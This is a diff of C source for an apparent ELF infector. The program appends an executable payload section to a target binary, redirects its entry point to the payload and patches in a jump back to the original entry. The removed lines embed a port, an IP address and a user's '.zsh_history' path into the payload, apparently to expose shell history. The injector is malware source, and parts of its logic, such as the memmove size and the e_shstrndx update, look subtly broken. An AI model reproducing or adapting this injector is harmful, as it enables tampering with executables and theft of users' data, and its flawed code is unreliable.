@@ -27,139 +27,125 @@ extern uint64_t CDECL_NORM(payload_size);
 uint16_t port = 0;
 uint32_t addr_ip = 0;
 
-int main(int argc, char *argv[], char *envp[]) {
+int main(void) {
 	port = htons(3002);
 	addr_ip = htonl(INADDR_ANY);
 	printf("port: %#x %#x\n", port, addr_ip);
 
-	int fd = open("testprog", O_RDWR);
-	if (fd == -1) {
-		perror("open");
-		return 1;
-	}
+	int fd = open(elf_filename, O_RDWR);
+    if (fd == -1) {
+        perror("open");
+        exit(EXIT_FAILURE);
+    }
 
-	struct stat st;
-	if (fstat(fd, &st) == -1) {
-		perror("fstat");
-		return 1;
-	}
+    struct stat st;
+    if (fstat(fd, &st) == -1) {
+        perror("fstat");
+        close(fd);
+        exit(EXIT_FAILURE);
+    }
 
-	void *map = mmap(NULL, st.st_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
-	if (map == MAP_FAILED) {
-		perror("mmap");
-		return 1;
-	}
+    size_t filesize = st.st_size;
+    size_t new_filesize = filesize + payload_size_p + sizeof(Elf64_Shdr);
+    if (ftruncate(fd, new_filesize) == -1) {
+        perror("ftruncate");
+        close(fd);
+        exit(EXIT_FAILURE);
+    }
 
-	Elf64_Ehdr *ehdr = (Elf64_Ehdr *)map;
-	Elf64_Phdr *phdr = (Elf64_Phdr *)(map + ehdr->e_phoff);
-	Elf64_Shdr *shdr = (Elf64_Shdr *)(map + ehdr->e_shoff);
+    void *map = mmap(NULL, new_filesize, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
+    if (map == MAP_FAILED) {
+        perror("mmap");
+        close(fd);
+        exit(EXIT_FAILURE);
+    }
 
-	int last_phdr = -1;
+    Elf64_Ehdr *ehdr = (Elf64_Ehdr *)map;
+    Elf64_Phdr *phdrs = (Elf64_Phdr *)((char *)map + ehdr->e_phoff);
+    Elf64_Shdr *shdrs = (Elf64_Shdr *)((char *)map + ehdr->e_shoff);
 
-	for (int i = 0; i < ehdr->e_phnum; i++) {
-		if (phdr[i].p_type == PT_LOAD) {
-			printf("found PT_LOAD\n");
-			phdr[i].p_flags = PF_R | PF_W | PF_X;
-			last_phdr = i;
-		}
-	}
+    // Find the last loadable segment
+    Elf64_Phdr *last_loadable_phdr = NULL;
+    for (int i = 0; i < ehdr->e_phnum; ++i) {
+        if (phdrs[i].p_type == PT_LOAD) {
+            last_loadable_phdr = &phdrs[i];
+        }
+    }
 
-	if (last_phdr == -1) {
-		fprintf(stderr, "no PT_LOAD found\n");
-		return 1;
-	}
+    if (!last_loadable_phdr) {
+        fprintf(stderr, "No loadable segment found\n");
+        munmap(map, new_filesize);
+        close(fd);
+        exit(EXIT_FAILURE);
+    }
 
-	Elf64_Phdr *last_phdr_p = &phdr[last_phdr];
+    // Find the last section in the last loadable segment
+    Elf64_Shdr *last_section_in_segment = NULL;
+    for (int i = 0; i < ehdr->e_shnum; ++i) {
+        if (shdrs[i].sh_offset >= last_loadable_phdr->p_offset &&
+            shdrs[i].sh_offset + shdrs[i].sh_size <= last_loadable_phdr->p_offset + last_loadable_phdr->p_filesz) {
+            last_section_in_segment = &shdrs[i];
+        }
+    }
 
-	int last_section = -1;
+    if (!last_section_in_segment) {
+        fprintf(stderr, "No section found in the last loadable segment\n");
+        munmap(map, new_filesize);
+        close(fd);
+        exit(EXIT_FAILURE);
+    }
 
-	for (int j = 1; j < ehdr->e_shnum; j++)
-	{
-		// find the last section in the last segment
-		if (shdr[j].sh_addr >= last_phdr_p->p_vaddr &&
-			shdr[j].sh_addr < last_phdr_p->p_vaddr + last_phdr_p->p_memsz)
-		{
-			last_section = j;
-		}
-	}
+    // Calculate new section header and data offsets
+    Elf64_Off new_section_offset = last_loadable_phdr->p_offset + last_loadable_phdr->p_filesz;
+    Elf64_Addr new_section_addr = last_loadable_phdr->p_vaddr + last_loadable_phdr->p_memsz;
 
-	printf("last_phdr: %d\n", last_phdr);
-	printf("last_section: %d\n", last_section);
+    // Update the last loadable segment sizes
+    last_loadable_phdr->p_filesz += payload_size_p;
+    last_loadable_phdr->p_memsz += payload_size_p;
 
-	// create new section
+    // Create new section header
+    Elf64_Shdr new_shdr = {
+        .sh_name = 0,
+        .sh_type = SHT_PROGBITS,
+        .sh_flags = SHF_ALLOC | SHF_EXECINSTR,
+        .sh_addr = new_section_addr,
+        .sh_offset = new_section_offset,
+        .sh_size = payload_size_p,
+        .sh_link = 0,
+        .sh_info = 0,
+        .sh_addralign = 1,
+        .sh_entsize = 0
+    };
 
-	Elf64_Shdr new_shdr = {
-		.sh_name = 0,
-		.sh_type = SHT_PROGBITS,
-		.sh_flags = SHF_ALLOC | SHF_EXECINSTR,
-		.sh_addr = last_phdr_p->p_vaddr + last_phdr_p->p_memsz,
-		.sh_offset = last_phdr_p->p_offset + last_phdr_p->p_filesz,
-		.sh_size = payload_size_p,
-		.sh_link = 0,
-	};
+    // Copy the new section header to the correct position
+    memmove(&shdrs[ehdr->e_shnum + 1], &shdrs[ehdr->e_shnum], sizeof(Elf64_Shdr) * (ehdr->e_shnum - last_section_in_segment->sh_offset));
+    shdrs[ehdr->e_shnum] = new_shdr;
 
-	// update program header
-	last_phdr_p->p_filesz += payload_size_p;
-	last_phdr_p->p_memsz += payload_size_p;
+    // Copy the payload data
+    memcpy((char *)map + new_section_offset, payload_p, payload_size_p);
 
-	// update section headers after the new one
-	// the section after `last_section` must be moved to leave space for the new section
+    // Update ELF header with new section count and string table index
+    ehdr->e_shnum += 1;
+    ehdr->e_shstrndx = ehdr->e_shnum - 1;
 
-	// since we are adding a new section, the file size must be increased and the file must be mapped again adding the section size + the payload size
-	ftruncate(fd, st.st_size + sizeof(Elf64_Shdr) + payload_size_p);
-	map = syscall(SYS_mremap, map, st.st_size, st.st_size + sizeof(Elf64_Shdr) + payload_size_p, 1, fd, 0);
+    // Update the entry point
+    Elf64_Addr old_entry_point = ehdr->e_entry;
+    ehdr->e_entry = new_section_addr;
 
-	if (map == MAP_FAILED) {
-		perror("mremap");
-		return 1;
-	}
+    // Calculate the relative jump offset to the old entry point
+    int32_t jump_offset = (int32_t)(old_entry_point - (new_section_addr + payload_size_p - 5) - 5);
 
-	for (int j = ehdr->e_shnum - 1; j > last_section; j--)
-	{
-		shdr[j + 1] = shdr[j];
-	}
+    // Write the relative jump instruction at the end of the payload
+    size_t jump_instr_offset = payload_size_p - 1186 - 6 - 4;
+    *((uint8_t *)map + new_section_offset + jump_instr_offset) = 0xE9; // Opcode for jmp (relative)
+    memcpy((char *)map + new_section_offset + jump_instr_offset + 1, &jump_offset, sizeof(int32_t));
 
-	// insert the new section
-	shdr[last_section + 1] = new_shdr;
+    // Cleanup
+    if (munmap(map, new_filesize) == -1) {
+        perror("munmap");
+    }
 
-	// the number of section headers has increased
-	ehdr->e_shnum++;
-
-
-	// move all the content at  map + new_shdr->sh_offset to leave space for the payload data
-
-	memmove(map + new_shdr.sh_offset + payload_size_p, map + new_shdr.sh_offset, st.st_size - new_shdr.sh_offset);
-
-	// copy the payload data to the new section
-
-	memcpy(map + new_shdr.sh_offset, payload_p, payload_size_p);
-
-	// update the payload patching the data
-
-	// update the addr_ip
-	memcpy(map + new_shdr.sh_offset + payload_size_p - 4, &addr_ip, sizeof(addr_ip));
-	// update the port
-	memcpy(map + new_shdr.sh_offset + payload_size_p - 4 - 2, &port, sizeof(port));
-	// copy the file path
-	memcpy(map + new_shdr.sh_offset + payload_size_p - 1024 - 6, "/home/maxence/.zsh_history", 27);
-
-	// update the entry point
-
-	ehdr->e_entry = new_shdr.sh_addr;
-
-	// add the old entry point to the payload
-
-	// get the old entry point
-	uint64_t old_entry = ehdr->e_entry;
-	// calculate the offset from the new entry point
-	int32_t offset = old_entry - new_shdr.sh_addr;
-	// update the payload with the offset
-	memcpy(map + new_shdr.sh_offset + payload_size_p - 1186 - 6 - 4, &offset, sizeof(offset));
-
-	// cleanup
-
-	munmap(map, st.st_size);
-	close(fd);
+    close(fd);
 
 	return 0;
 }
